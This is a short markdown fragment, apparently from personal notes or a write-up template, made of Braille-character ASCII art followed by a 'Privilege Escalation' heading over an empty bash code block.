⣯⢏⡷⣽⡹⢯⣽⡹⢯⡽⣭⢯⡽⣞⢯⡽⣚⣧⢟⡞⣧⣟⠮⠗⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠓⠛⠽⢎⣟⢶⣛⡶⣽⢲⡻⣜⡻⣜⢧⡻⣜⡏⡿⣜⢯⡳⣝⢮⡽
⣯⢯⡽⢶⣛⣯⢶⣛⣯⢞⣧⠿⣼⣹⢮⣗⣻⡼⠟⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠺⢵⣫⢷⡹⢧⡻⣝⢮⡳⣝⢾⡱⣏⢾⡱⣏⢾⣱
⣟⡮⣟⣭⠷⣞⡽⣞⡼⣏⡾⣝⡧⣟⡾⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢯⣏⢷⡹⣎⢷⡹⣎⢷⡹⣎⢷⡹⣎⠷
⣯⢷⡻⣼⢻⡝⣾⡹⣞⡽⣞⢧⠟⠊⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⡿⣿⣿⣿⣷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠫⣷⡹⢮⢷⡹⣎⢷⡹⣎⠷⣭⢻
⣟⡾⣝⣳⢯⣻⡼⣏⡷⣯⠟⠁⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣻⣿⣿⣿⣿⢹⣿⣿⣿⣟⣷⣉⠻⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠈⠻⡽⣎⢷⡹⣎⢷⣹⢻⡜⣯
⣟⡾⣹⢧⡿⣱⣟⣾⡽⠃⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣟⣵⣿⣿⣿⣿⣿⢺⣿⣿⣿⣿⢮⣳⣖⡘⣿⣿⣟⣯⣿⣟⣿⣶⣄⠀⠀⠀⠀⠀⠀⠈⢻⢮⡽⣹⢎⡷⣫⢞⡵
⣯⡽⣛⣮⣽⣳⣿⠎⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣱⣿⡿⢛⠿⠋⠙⠘⠛⠛⠿⣿⢯⣷⢳⡮⠼⣿⣿⣿⣟⣿⣻⣾⣟⣷⣄⠀⠀⠀⠀⠀⠀⠙⣾⣱⡻⣜⢧⡻⣼
⣧⢿⣻⠼⣧⣿⠇⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⣤⠃⠀⠀⠀⠀⠀⠀⠘⢧⠘⢇⢿⡃⣸⣿⣟⣿⡿⣿⣧⣿⣟⣿⣄⠀⠀⠀⠀⠀⠀⠘⣧⡻⣼⣛⢧⢧
⣟⡾⣭⢿⣿⠋⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣺⡇⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠸⠃⠀⣯⣆⣧⣻⣿⡿⣿⣟⣷⣿⢾⣯⢿⣷⡀⠀⠀⠀⠀⠀⠘⣗⣧⣛⣮⢻
⡿⣼⣻⣿⠏⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢽⣁⡴⣷⠶⡤⠤⠤⠄⡤⠤⠴⣶⣶⢦⣹⠿⣿⣿⣿⣿⣿⢿⣿⣾⡿⣯⣿⣞⣿⡄⠀⠀⠀⠀⠀⠘⣶⢫⡞⣽
⣟⣷⣿⡟⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢹⢹⡼⣿⠷⣉⢎⣱⣉⠲⣉⠶⢿⢿⢀⣇⢈⣿⣿⣿⣿⣿⣿⣿⣾⢿⣟⣷⣿⣳⡿⡄⠀⠀⠀⠀⠀⢹⡳⣽⢳
⣿⣾⣿⠁⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣧⠘⠄⠑⠛⠓⠚⢚⠋⠀⠙⠒⠘⢛⠚⠈⠈⢢⣷⣿⣿⣿⣿⣾⣿⣻⣿⣟⣿⣾⣻⣽⣷⠀⠀⠀⠀⠀⠀⢿⣱⢯
⣿⣿⡟⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⡷⢾⡀⠀⠀⠀⠐⠤⣒⠆⠀⠀⠀⠀⣴⣶⣿⢼⣧⣿⣿⣿⣿⣿⣿⣟⣿⣿⣾⣟⣷⡿⡇⠀⠀⠀⠀⠀⢸⣽⢺
⣿⣿⡇⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⢹⣷⡀⠀⠀⠠⠴⠶⠤⠄⠀⠀⣰⡿⣿⣿⣯⢻⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣽⣯⣿⢿⠀⠀⠀⠀⠀⠈⣞⣯
⣿⣿⠅⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⡌⣿⣿⡦⡀⠀⠀⠋⠀⠀⠀⣾⣿⣧⢿⡘⣟⠇⣿⣿⣿⣿⣿⣿⣿⣽⣿⣾⣿⣽⣾⣿⠀⠀⠀⠀⠀⠀⡿⣼
⣿⣿⠂⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣾⣿⣿⣿⡇⢿⣿⡇⠈⢑⡚⣲⠖⠉⠀⣿⣟⡣⡻⡼⣷⡷⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣿⢿⣾⠀⠀⠀⠀⠀⠀⣟⣳
⣿⣿⡃⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣿⡿⣵⣿⣿⠇⠀⠀⠁⠀⠄⠀⠀⣿⣿⣿⡬⢸⣿⣿⣵⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣟⣳
⣿⣿⡇⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣯⣾⣿⣿⠻⠀⠀⠀⠀⠀⠀⠀⠀⠘⢛⣿⣷⣵⣝⠿⣿⡐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡟⠀⠀⠀⠀⠀⢠⢯⢷
⣿⣿⣷⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣵⣿⣿⣿⣿⣿⡄⠀⠀⢀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣾⣿⣷⣬⠷⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⢸⣻⢞
⣿⣿⣿⡆⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⡿⢟⣯⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⡿⣏⢷⣫⢴⣨⣙⠻⢿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⣟⣧⣟
⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⢀⣾⣿⣿⣿⣿⣿⡿⣯⢗⣻⣎⢷⣻⡗⣮⢣⡍⢿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⣸⣛⡶⣽
⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠻⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠣⣿⣿⣿⣿⣿⢯⡿⣝⣯⢳⡞⣿⣿⣽⣳⡿⡼⡘⣿⣿⡿⠁⠀⠀⠀⠀⠀⢰⣯⠽⣞⡽
⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠙⣿⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣽⡿⣽⣏⢾⣫⡽⣿⣿⣿⣿⢽⣱⢇⢻⠟⠀⠀⠀⠀⠀⠀⢠⣟⡞⣯⡽⣞
⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⢻⣿⣿⣿⠀⣿⣿⣿⣾⣯⡟⣷⡞⣯⢳⣽⣾⣿⣿⣿⣿⢻⣾⠈⠀⠀⠀⠀⠀⠀⢰⣿⢹⡞⣧⡟⣾
⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⡗⠒⠒⠒⠒⢲⣿⣿⣿⠀⣿⣿⣿⣽⣾⣟⡷⣽⠾⣽⣻⢿⣿⣿⣿⣯⠟⠁⠀⠀⠀⠀⠀⠀⣠⡿⣭⢷⡻⣼⢳⡽
⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣾⣿⣿⣿⣷⣯⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⢀⣼⣟⣳⡻⢮⣽⢳⡯⣽
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⢳⡞⣧⣟⣻⡼⣳⡽⣳
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠿⠿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⡿⣿⣿⡫⠉⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣻⡼⢯⣽⢳⡾⣱⢯⣳⢽⣳
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⡟⣧⢷⣛⡿⡼⣏⡷⢯⣳⣏⡷⣫
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣻⢧⡿⣭⡟⣽⡞⣽⡽⣹⢯⣗⡾⣹⢷
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣶⣾⣿⣿⣿⣟⢿⣚⣧⣟⢾⣳⡽⢧⣟⣧⢿⣹⠷⣾⣹⢯⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⡿⣿⣻⡽⣞⣭⢿⣻⣞⣞⣯⣳⢻⣻⡼⢾⣭⢷⡻⢧⣟⢾⣹
```
----
#### Privilege Escalation
```bash

```
